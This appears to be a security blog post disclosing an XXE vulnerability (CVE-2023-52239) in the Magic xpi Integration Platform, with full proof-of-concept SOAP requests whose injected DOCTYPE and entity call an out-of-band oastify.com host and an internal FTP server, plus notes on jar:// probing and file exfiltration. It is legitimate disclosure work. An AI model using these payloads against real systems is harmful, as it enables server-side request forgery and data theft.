<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Introduction During one of our assessments we found a so called XML External Entity Injection (XXE) vulnerability in the Magic® xpi Integration Platform (https://www.magicsoftware.com/integration-platform/xpi).
After disclosing this information to the vendor, they fixed it immediately. Communication was always profesional.
CVE-2023-52239 has been assigned to this vulnerability.
What is an XML External Entity Injection? A short explaination An XML External Entity (XXE) Injection is a security vulnerability that occurs when an attacker can influence the processing of XML input to include external entities, often leading to unauthorized access or disclosure of internal files and information." />
<meta name="keywords" content="IT-Security, Pentesting" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://192.168.1.161/post/xml_external_entity_injection_magic_xpi/" />


    <title>
        
            XML External Entity Injection (XXE) in Magic® xpi Integration Platform (CVE-2023-52239) :: ds-security.com  — A blog about IT-Security Research
        
    </title>





<link rel="stylesheet" href="/main.8f1329592a8700ee1d6e2b799cc78e5b316724acb9c2eabb41413ac3b1f15fca.css" integrity="sha256-jxMpWSqHAO4dbit5nMeOWzFnJKy5wuq7QUE6w7HxX8o=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="XML External Entity Injection (XXE) in Magic® xpi Integration Platform (CVE-2023-52239)">
<meta itemprop="description" content="Introduction During one of our assessments we found a so called XML External Entity Injection (XXE) vulnerability in the Magic® xpi Integration Platform (https://www.magicsoftware.com/integration-platform/xpi).
After disclosing this information to the vendor, they fixed it immediately. Communication was always profesional.
CVE-2023-52239 has been assigned to this vulnerability.
What is an XML External Entity Injection? A short explaination An XML External Entity (XXE) Injection is a security vulnerability that occurs when an attacker can influence the processing of XML input to include external entities, often leading to unauthorized access or disclosure of internal files and information."><meta itemprop="datePublished" content="2023-12-28T00:00:00+00:00" />
<meta itemprop="dateModified" content="2023-12-28T00:00:00+00:00" />
<meta itemprop="wordCount" content="548"><meta itemprop="image" content="http://192.168.1.161"/>
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://192.168.1.161"/>

<meta name="twitter:title" content="XML External Entity Injection (XXE) in Magic® xpi Integration Platform (CVE-2023-52239)"/>
<meta name="twitter:description" content="Introduction During one of our assessments we found a so called XML External Entity Injection (XXE) vulnerability in the Magic® xpi Integration Platform (https://www.magicsoftware.com/integration-platform/xpi).
After disclosing this information to the vendor, they fixed it immediately. Communication was always profesional.
CVE-2023-52239 has been assigned to this vulnerability.
What is an XML External Entity Injection? A short explaination An XML External Entity (XXE) Injection is a security vulnerability that occurs when an attacker can influence the processing of XML input to include external entities, often leading to unauthorized access or disclosure of internal files and information."/>



    <meta property="og:title" content="XML External Entity Injection (XXE) in Magic® xpi Integration Platform (CVE-2023-52239)" />
<meta property="og:description" content="Introduction During one of our assessments we found a so called XML External Entity Injection (XXE) vulnerability in the Magic® xpi Integration Platform (https://www.magicsoftware.com/integration-platform/xpi).
After disclosing this information to the vendor, they fixed it immediately. Communication was always profesional.
CVE-2023-52239 has been assigned to this vulnerability.
What is an XML External Entity Injection? A short explaination An XML External Entity (XXE) Injection is a security vulnerability that occurs when an attacker can influence the processing of XML input to include external entities, often leading to unauthorized access or disclosure of internal files and information." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://192.168.1.161/post/xml_external_entity_injection_magic_xpi/" /><meta property="og:image" content="http://192.168.1.161"/><meta property="article:section" content="post" />
<meta property="article:published_time" content="2023-12-28T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-12-28T00:00:00+00:00" />






    <meta property="article:published_time" content="2023-12-28 00:00:00 &#43;0000 UTC" />











    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                $ cd /home</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about-me">about-me</a></li><li><a href="/post">Blog</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://192.168.1.161/post/xml_external_entity_injection_magic_xpi/">XML External Entity Injection (XXE) in Magic® xpi Integration Platform (CVE-2023-52239)</a></h2>

            
            
            

            <div class="post-content">
                <h2 id="introduction">Introduction</h2>
<p>During one of our assessments we found a so called XML External Entity Injection (XXE) vulnerability in the Magic® xpi
Integration Platform (<a href="https://www.magicsoftware.com/integration-platform/xpi)">https://www.magicsoftware.com/integration-platform/xpi)</a>.</p>
<p>After disclosing this information to the vendor, they fixed it immediately. Communication was always profesional.</p>
<p><a href="https://nvd.nist.gov/vuln/detail/cve-2023-52239">CVE-2023-52239</a> has been assigned to this vulnerability.</p>
<h2 id="what-is-an-xml-external-entity-injection">What is an XML External Entity Injection?</h2>
<h3 id="a-short-explaination">A short explaination</h3>
<p>An XML External Entity (XXE) Injection is a security vulnerability that occurs when an attacker can influence the processing of XML input to include external entities, often leading to unauthorized access or disclosure of internal files and information. This type of attack exploits the ability of XML parsers to interpret external entities, allowing the attacker to manipulate the application&rsquo;s behavior and potentially extract sensitive data.</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<h2 id="the-vulnerability-in-magic-xpi">The vulnerability in magic xpi</h2>
<p>The XXE was very classical, allowing the inclusion of an external entity.</p>
<p><em>Affected Software:</em> <a href="https://www.magicsoftware.com/">https://www.magicsoftware.com/</a>  (Version: 4.13.4)</p>
<p>The vulnerability allows an attacker to cause the web server to execute <code>HTTP</code> or <code>FTP</code> requests to other third-party systems.</p>
<p>It was also possible to cause an HTTP request to external services with the following request.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /services/ON_DataHandling/onItemImport <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">soap-test01.abc.com</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/xml; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Soapaction<span style="color:#f92672">:</span> <span style="color:#ae81ff">document/http://localhost:6060/:itemImport</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">PostmanRuntime/7.32.3</span>
</span></span><span style="display:flex;"><span>Authorization<span style="color:#f92672">:</span> <span style="color:#ae81ff">Basic xxxx</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
</span></span><span style="display:flex;"><span>Postman-Token<span style="color:#f92672">:</span> <span style="color:#ae81ff">fcef1dd4-6ac0-423a-9027-3a714b4e3ca8</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">2643</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;&lt;!DOCTYPE soap:envelope PUBLIC &#34;-//B/A/EN&#34; &#34;http://9blpqy1jw2vryok1fdqjw8kz9qfm3craf16owcl.oastify.com&#34;&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;soap:Envelope</span> <span style="color:#a6e22e">xmlns:soap=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;soap:Body&gt;</span>
</span></span></code></pre></div><p>In the request above, the payload <code>&lt;!DOCTYPE soap:envelope PUBLIC &quot;-//B/A/EN&quot; &quot;http://9blpqy1jw2vryok1fdqjw8kz9qfm3craf16owcl.oastify.com&quot;&gt;</code> was added, which causes the application to send the following HTTP request to the external URL.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
</span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Java/1.8.0_241</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">9blpqy1jw2vryok1fdqjw8kz9qfm3craf16owcl.oastify.com</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span></code></pre></div><p>This already proves, that external entities are evaluated and executed. Besides external <code>HTTP</code> requests, it was also possible to request external files via the <code>FTP</code> protocol. The following request includes the payload <code>file:\\172.19.8.50/test.txt</code> which accesses the file named <code>test</code> via FTP from the server with the IP address <code>172.19.8.50</code>. For authentication the application uses the username <code>anonymous</code> and the used java-version <code>Java/1.8.0_241</code> as the password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /services/ON_DataHandling/onItemImport <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">soap-test01.abc.com</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/xml; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Soapaction<span style="color:#f92672">:</span> <span style="color:#ae81ff">document/http://localhost:6060/:itemImport</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">PostmanRuntime/7.32.3</span>
</span></span><span style="display:flex;"><span>Authorization<span style="color:#f92672">:</span> <span style="color:#ae81ff">Basic xxxx</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
</span></span><span style="display:flex;"><span>Postman-Token<span style="color:#f92672">:</span> <span style="color:#ae81ff">fcef1dd4-6ac0-423a-9027-3a714b4e3ca8</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">145</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:\\172.19.8.50/test.txt&#34;&gt;</span> ]&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;sessionId&gt;</span>
</span></span><span style="display:flex;"><span>&amp;xxe;
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/sessionId&gt;</span>
</span></span></code></pre></div><p>To receive the above-mentioned FTP request the program FileZilla was used. The following screenshot shows the incoming request in FileZilla.
<img src="../../files/xxe_ftp_connection_logs.png" alt="FTP-Server-Side of the above request"></p>
<p>While enumerating different filters, it was determined, that the <code>jar://</code> URL handler was registered by the application. This makes sense, because the affected application (magic xpi) is apparently written in java. Combined with the ability to request external resources via HTTP or FTP, execution of an arbitrary java was thought to be possible.
So a <code>JAR</code> file was created and requested, as it can be seen in the following two figures. First a non-existing entry got specified, resulting in another Path disclosure.</p>
<p><img src="../../files/xxe_path_disclosure.png" alt="Giving a false JAR entry results in Path disclosure "></p>
<p>If an existing entry point is specified, the JVM shows the error &ldquo;Invalid byte 2 of 2-byte UTF-8 sequence.&rdquo; This usually means that the encoding of the XML file does not match with the encoding configuration of the parser. Due to time constraints in our assessment it was not possible for us to get to the bottom of this. However, it is certainly possible to exfiltrate arbitrary files and paths as well es to perform the famous <a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion laughs attack</a>.</p>
<p><img src="../../files/xxe_byte_sequence.png" alt="Trying to execute the Java with the valid entry point"></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.205d491810c28f95aa953fae884e1c27abe13fdf93ec63b882d0036b248d4a6282eb2d134e4e7225c6ad6e86db87b08488a361ca4a7383d01fcff43f3d57b9c3.js" integrity="sha512-IF1JGBDCj5WqlT&#43;uiE4cJ6vhP9&#43;T7GO4gtADaySNSmKC6y0TTk5yJcatbobbh7CEiKNhykpzg9Afz/Q/PVe5ww=="></script>



    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9000e338fd0f7761","version":"2024.10.5","r":1,"serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"524e0ea9b8fa4e9f9205e03898bd54df","b":1}' crossorigin="anonymous"></script>
</body>
</html>
